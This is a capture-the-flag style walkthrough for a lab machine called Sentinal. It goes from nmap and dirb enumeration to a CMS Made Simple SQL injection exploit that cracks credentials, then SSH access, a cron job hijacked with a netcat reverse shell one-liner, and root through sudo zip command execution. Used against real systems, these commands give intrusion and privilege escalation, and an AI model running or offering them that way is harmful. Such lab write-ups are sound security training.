# Exploitation Guide for Sentinal

## Enumeration

We start the enumeration process with a simple Nmap scan:
```
kali@kali:~/# nmap 192.168.83.150
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-14 03:54 EDT
Nmap scan report for 192.168.83.150
Host is up (0.00041s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
We find port 80 is open and visit it in our browser as a first step. On the page we find apache default home page. 
Checking /robots.txt and source code don't giveus anything. So let's start directory bruteforcing using dirb.

```
root@sentinal-VirtualBox:~# dirb http://192.168.83.150 -X .txt
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Sat Sep 19 05:49:57 2020
URL_BASE: http://192.168.83.150/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]
-----------------
GENERATED WORDS: 4612                                                          
---- Scanning URL: http://192.168.83.150/ ----
+ http://192.168.83.150/note.txt (CODE:200|SIZE:151)                                                                                                                                                                                      
-----------------
END_TIME: Sat Sep 19 05:49:59 2020
DOWNLOADED: 4612 - FOUND: 1
```

We find a hidden note.txt that says
```
Dear Developers,

Our website is moved to sentinal.com
Do login into the panel, configure the website and start building project.

Thank you
sys admin
```


It is running an virtual host of sentinal.com
So we have to add sentinal.com in /etc/hosts
```
root@kunal:~# nano /etc/hosts
192.168.83.150  sentinal.com
```

## Exploitation

On visiting sentinal.com in our browser, we find it is running `CMS Made Simple v2.2.9`.
Searching for an exploit, we find it is vulnerable to SQL injection.
```
Cmsms < 2.2.10 SQL Injection
https://www.exploit-db.com/exploits/46635
```
Before running the script make sure following packages are installed
```
	apt install python-pip
	pip install requests
	pip install setuptools
	pip install termcolor
```
Execute the script with a wordlist to bruteforce
```
python 46635.py -u http://sentinal.com -w /opt/rockyou.txt --crack 

[+] Salt for password found: 551c92a536111490
[+] Username found: juniordev
[+] Email found: juniordev@sentinal.com
[+] Password found: a25bb9e6782e7329c236d2538dd4f5ac
[+] Password cracked: passion
```
Now we can use SSH with obtained creds to login to the system
```
ssh juniordev@192.168.83.150
password: passion

juniordev@sentinal: whoami
juniordev
```
## User Escalation

Looking at the /etc/crontab we find there is a cronjob run by user sentinal every minute
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * sentinal /home/sentinal/Pictures/sentinal.sh
```


Going to /home/sentinal/Pictures and checking file permissions on senitnal.sh we find it is writable by user juniordev
```
juniordev@sentinal:/home/sentinal/Pictures$ ls -la
total 12
drwxr-xr-x  2 sentinal sentinal 4096 Sep 19 05:42 .
drwxr-xr-x 17 sentinal sentinal 4096 Sep 19 08:09 ..
-rwxrwxrw-  1 sentinal sentinal   76 Sep 19 08:12 sentinal.sh
```
Adding a reverse shell in sentinal.sh and getting a shell as user sentinal
```	
juniordev@sentinal:/home/sentinal/Pictures$ nano sentinal.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.6.2 920 >/tmp/f
```


## Root Escalation

User sentinal can run /bin/zip as sudo
```
sentinal@sentinal:~$ sudo -l
sudo -l
Matching Defaults entries for sentinal on sentinal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sentinal may run the following commands on sentinal:
    (ALL) NOPASSWD: /bin/zip
```
zip binary has an unzip-command argument that can be used to run arbitary commands on the system 
```
sudo /bin/zip /tmp/kunal.zip /tmp/ -T --unzip-command="sh -c /bin/bash"
```
Another way to exploit zip binary is using gtfobins
```
sudo /usr/bin/zip mktemp -T -TT 'bash #'
```
And we are root
# id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root
	
